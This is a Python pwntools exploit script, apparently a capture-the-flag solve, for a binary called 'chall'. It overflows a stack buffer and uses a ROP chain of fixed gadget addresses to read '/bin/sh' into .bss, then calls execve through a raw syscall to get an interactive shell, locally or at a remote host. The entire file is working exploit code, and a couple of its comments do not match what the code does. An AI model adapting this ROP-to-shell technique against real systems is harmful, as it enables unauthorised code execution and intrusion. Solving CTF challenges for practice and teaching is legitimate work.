#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./chall"
#libc = ELF()
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("example.com", 4444)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b *0x00402ea1
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


rop_pop_rdi = 0x00402d34
rop_pop_rsi_pop_r15 = 0x00402d32
rop_pop_rdx = 0x00402db8
rop_pop_rax = 0x00402ea5
rop_syscall_ret = 0x00402ea1
bss_addr = elf.get_section_by_name(".bss").header["sh_addr"] + 0x200
binsh_str = b"/bin/sh\0"

payload = b"A" * 0x100
payload += b"B" * 8
# call read(1, .bss + 0x100, len(binsh_str))
payload += p64(rop_pop_rdi)
payload += p64(0)
payload += p64(rop_pop_rsi_pop_r15)
payload += p64(bss_addr)
payload += p64(0xdeadbeef)
payload += p64(rop_pop_rdx)
payload += p64(len(binsh_str))
payload += p64(rop_syscall_ret)
payload += p64(rop_pop_rdi)
payload += p64(bss_addr)
payload += p64(rop_pop_rsi_pop_r15)
payload += p64(0)
payload += p64(0xdeadbeef)
payload += p64(rop_pop_rdx)
payload += p64(0)
payload += p64(rop_pop_rax)
payload += p64(59)
payload += p64(rop_syscall_ret)

p.recvuntil("name?")
p.sendline(payload)
sleep(0.5)
p.send(binsh_str)

p.interactive()
